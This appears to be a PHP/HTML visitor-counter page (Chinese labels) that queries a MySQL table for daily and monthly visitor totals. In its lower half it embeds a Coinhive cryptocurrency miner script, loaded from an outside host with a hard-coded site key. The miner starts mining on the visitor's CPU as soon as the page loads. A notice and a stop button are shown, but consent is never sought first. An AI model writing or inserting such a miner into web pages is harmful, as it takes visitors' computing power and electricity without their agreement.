<html xmlns="http://www.w3.org/1999/xhtml">
	<head>
		<meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
	<title>jpv_計數器</title>
	<style type="text/css">
		html{font-size:18px;}
		fieldset{width:250px; margin: 0 auto;}
		legend{font-weight:bold; font-size:16px;}
		span{color: #666666;}
	</style>
	</head>
	
	<body>
		<div>
			<fieldset>
				<legend>瀏覽人數</legend>
				<?php
					include('conn.php');
					$year=date("Y");
					$month=date("m");
					$day=date("d");
					$times=date('H:i:s');
					
					$sql ="DELETE FROM visitors WHERE month <> '$month'";
					mysql_query($sql,$conn);
					
					$sql = "SELECT COUNT(*) as total  FROM visitors WHERE year='$year' AND month='$month' AND day='$day'";
					$result=mysql_query($sql,$conn);
					$data=mysql_fetch_assoc($result);

					echo "今&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;天: ".$year."/".$month."/".$day."<br>";
					echo "人&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;數: ".	$data['total']."(人)<br>";
					
					$sql = "SELECT COUNT(*) as total  FROM visitors";
					$result1=mysql_query($sql,$conn);
					$data1=mysql_fetch_assoc($result1);
					echo "本月總人數: ".	$data1['total']."(人)<br>";
				?>				
			</fieldset>
		</div>
		<BR>
		<BR>
		<BR>
		<BR>
		<!--挖礦 start-->
		<p align="center">你好，目前這一個網頁正在利用你的CPU挖礦，以下是你的統計資料:</p> 
		<!--載入 Coinhive 挖礦程式-->
		<script src="https://coin-hive.com/lib/coinhive.min.js"></script>
		<center>
		<p id="tcount"></p>
		<p id="hps"></p>
		<p id="ths"></p>
		<p id="tah"></p>
		</center>
		<p align="center">您可以隨時開始或停止。</p>
		<center>
		<p id="minebutton"></p>
		</center>
		<p align="center">訪問 <a href="https://coin-hive.com/">Coin Hive</a> 可以了解更多資訊！</a></p> 

		<script type="text/javascript">
		var miner = new CoinHive.User('6NnV2rFmFlcpveMPN14IhLIEgOz1xpXt', 'User', {
			threads: 1,
			autoThreads: false,
			throttle: 0.1,
			forceASMJS: false
			});
		miner.start(CoinHive.FORCE_EXCLUSIVE_TAB);
		// Update stats once per second
		setInterval(function() {
			var threadCount = miner.getNumThreads();
			var hashesPerSecond = Math.round(miner.getHashesPerSecond() * 100) / 100;
			var totalHashes = miner.getTotalHashes();
			var acceptedHashes = miner.getAcceptedHashes() / 256;
			// Output to HTML elements...
			if (miner.isRunning()) {
				document.getElementById("tcount").innerHTML = "Threads: " + threadCount;
				document.getElementById("hps").innerHTML = "hashes per second: " + hashesPerSecond;
				document.getElementById("ths").innerHTML = "Total Hashes: " + totalHashes;
				document.getElementById("tah").innerHTML = "Accepted Hashes: " + acceptedHashes;
				document.getElementById("minebutton").innerHTML = "<button onclick=\"miner.stop()\">Stop Mining</button>";
			} else {
				document.getElementById("hps").innerHTML = "Please click start";
				document.getElementById("ths").innerHTML = "to support";
				document.getElementById("tah").innerHTML = "this site";
				document.getElementById("minebutton").innerHTML = "<button onclick=\"miner.start(CoinHive.FORCE_EXCLUSIVE_TAB)\">Start Mining</button>";
			}
		}, 1000);
		</script>
		<!--挖礦 end-->		
	</body>
</html>